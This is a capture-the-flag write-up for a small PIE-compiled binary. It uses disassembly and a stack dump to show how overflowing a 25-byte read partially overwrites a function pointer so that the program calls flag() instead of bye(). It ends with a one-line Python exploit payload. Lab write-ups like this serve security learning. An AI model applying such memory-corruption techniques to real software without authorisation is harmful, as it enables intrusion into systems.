# Solution

The binary has 3 functions: `main()`, `bye()`, and `flag()`. It reads
0x20 bytes, and then calls `bye()` via a function pointer . We can use 
the 20-byte read to overwrite the function pointer to `bye()` and instead 
call `flag()`.


The problem is that the binary is compiled with PIE, and the address of `flag()`
will be randomized. However, since x86 is little-endian, the lower-order bytes
are the first to be overwritten. All that needs to be done is write these lower
order bytes and keep the higher-order bytes intact.


Dissasembling the binary gives us:
```
/ (fcn) sym.Bye 19
|   sym.Bye ();
|           ; DATA XREF from 0x5569b74f380e (sym.main)
|           0x5569b74f37e0      55             push rbp
|           0x5569b74f37e1      4889e5         mov rbp, rsp
|           0x5569b74f37e4      488d3d4d0100.  lea rdi, str.Bye_bye    ; 0x5569b74f3938 ; str.Bye_bye ; "Bye bye" @ 0x5569b74f3938
|           0x5569b74f37eb      e890feffff     call sym.imp.puts      ; int puts(const char *s);
|           0x5569b74f37f0      90             nop
|           0x5569b74f37f1      5d             pop rbp
\           0x5569b74f37f2      c3             ret
/ (fcn) sym.Flag 19
|   sym.Flag ();
|           0x5569b74f37f3      55             push rbp
|           0x5569b74f37f4      4889e5         mov rbp, rsp
|           0x5569b74f37f7      488d3d420100.  lea rdi, str.EKO_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx_ ; 0x5569b74f3940 ; str.EKO_xxxxxxxxxxxxxxxxxxxxxxxxxxxxx_ ; "EKO{xxxxxxxxxxxxxxxxxxxxxxxxxxxxx}" @ 0x5569b74f3940
|           0x5569b74f37fe      e87dfeffff     call sym.imp.puts      ; int puts(const char *s);
|           0x5569b74f3803      90             nop
|           0x5569b74f3804      5d             pop rbp
\           0x5569b74f3805      c3             ret
/ (fcn) sym.main 161
|   sym.main ();
|           ; var int local_20h @ rbp-0x20
|           ; var int local_8h @ rbp-0x8
|           ; DATA XREF from 0x556a6a13f6cd (entry0)
|           0x556a6a13f806      55             push rbp
|           0x556a6a13f807      4889e5         mov rbp, rsp
|           0x556a6a13f80a      4883ec20       sub rsp, 0x20
|           0x556a6a13f80e      488d05cbffff.  lea rax, sym.Bye        ; 0x556a6a13f7e0 ; sym.Bye ; "UH..H.=M." @ 0x556a6a13f7e0
|           0x556a6a13f815      488945f8       mov qword [rbp - local_8h], rax
|           0x556a6a13f819      488b05000820.  mov rax, qword [obj.stdin] ; [0x556a6a340020:8]=0 LEA obj.stdin ; obj.stdin
|           0x556a6a13f820      b900000000     mov ecx, 0
|           0x556a6a13f825      ba02000000     mov edx, 2
|           0x556a6a13f82a      be00000000     mov esi, 0
|           0x556a6a13f82f      4889c7         mov rdi, rax
|           0x556a6a13f832      e861feffff     call sym.imp.setvbuf   ; int setvbuf(FILE *stream,  char*,  int,  size_t);
|           0x556a6a13f837      488b05d20720.  mov rax, qword [obj.stdout] ; [0x556a6a340010:8]=0 LEA loc.stdout ; loc.stdout
|           0x556a6a13f83e      b900000000     mov ecx, 0
|           0x556a6a13f843      ba02000000     mov edx, 2
|           0x556a6a13f848      be00000000     mov esi, 0
|           0x556a6a13f84d      4889c7         mov rdi, rax
|           0x556a6a13f850      e843feffff     call sym.imp.setvbuf   ; int setvbuf(FILE *stream,  char*,  int,  size_t);
|           0x556a6a13f855      488d3d0c0100.  lea rdi, str.Welcome__give_me_you_best_shot ; 0x556a6a13f968 ; str.Welcome__give_me_you_best_shot ; "Welcome, give me you best shot" @ 0x556a6a13f968
|           0x556a6a13f85c      e81ffeffff     call sym.imp.puts      ; int puts(const char *s);
|           0x556a6a13f861      488b05a80720.  mov rax, qword [obj.stdout] ; [0x556a6a340010:8]=0 LEA loc.stdout ; loc.stdout
|           0x556a6a13f868      4889c7         mov rdi, rax
|           0x556a6a13f86b      e820feffff     call sym.imp.fflush    ; int fflush(FILE *stream);
|           0x556a6a13f870      488d45e0       lea rax, [rbp - local_20h]
|           0x556a6a13f874      ba19000000     mov edx, 0x19           ; 25
|           0x556a6a13f879      4889c6         mov rsi, rax
|           0x556a6a13f87c      bf00000000     mov edi, 0
|           0x556a6a13f881      e802feffff     call sym.imp.read      ; ssize_t read(int fildes, void *buf, size_t nbyte);
|           0x556a6a13f886      488b05930720.  mov rax, qword [obj.stdin] ; [0x556a6a340020:8]=0 LEA obj.stdin ; obj.stdin
|           0x556a6a13f88d      4889c7         mov rdi, rax
|           0x556a6a13f890      e8fbfdffff     call sym.imp.fflush    ; int fflush(FILE *stream);
|           0x556a6a13f895      488b55f8       mov rdx, qword [rbp - local_8h]
|           0x556a6a13f899      b800000000     mov eax, 0
|           0x556a6a13f89e      ffd2           call rdx
|           0x556a6a13f8a0      b800000000     mov eax, 0
|           0x556a6a13f8a5      c9             leave
\           0x556a6a13f8a6      c3             ret
```

`flag()` lives at 0x5569b74f37f3 and `bye()` lives at 0x5569b74f37e0. Overwritin the last 
byte of the function pointer in order to change `e0` to `f3` will make the binary call `flag()`. 
Setting a breakpoint after read, and analysing the stack gives: 
```
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp
0x7ffe4d6c32d0  4141 4242 4343 4444 0a36 4fb7 6955 0000  AABBCCDD.6O.iU..
0x7ffe4d6c32e0  d033 6c4d fe7f 0000 e037 4fb7 6955 0000  .3lM.....7O.iU..
                 /rbp
0x7ffe4d6c32f0  b038 4fb7 6955 0000 3068 03dd fd7e 0000  .8O.iU..0h...~..
0x7ffe4d6c3300  0100 0000 0000 0000 d833 6c4d fe7f 0000  .........3lM....
0x7ffe4d6c3310  a04c 60dd 0100 0000 0638 4fb7 6955 0000  .L`......8O.iU..
0x7ffe4d6c3320  0000 0000 0000 0000 8fef ba37 f70d ebeb  ...........7....
0x7ffe4d6c3330  b036 4fb7 6955 0000 d033 6c4d fe7f 0000  .6O.iU...3lM....
0x7ffe4d6c3340  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffe4d6c3350  8fef da20 b1f9 c4be 8fef 0a89 6fd9 c3bc  ... ........o...
0x7ffe4d6c3360  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7ffe4d6c3370  0000 0000 0000 0000 e833 6c4d fe7f 0000  .........3lM....
```

The location of the pointer to `bye()` is at address 0x7ffe4d6c32e8, and the buffer 
starts at 0x7ffe4d6c32d0 where we wrote "AABBCCDD". Thus, to overwrite the pointer, 
write `0x7ffe4d6c32d0 - 0x7ffe4d6c32e8 = 24` bytes, followed by the f3 which will
overwrite the e0, changing the function pointer to point to flag. 


In python:
```
$ python -c "print 'A'*24 + '\xf3'"
```

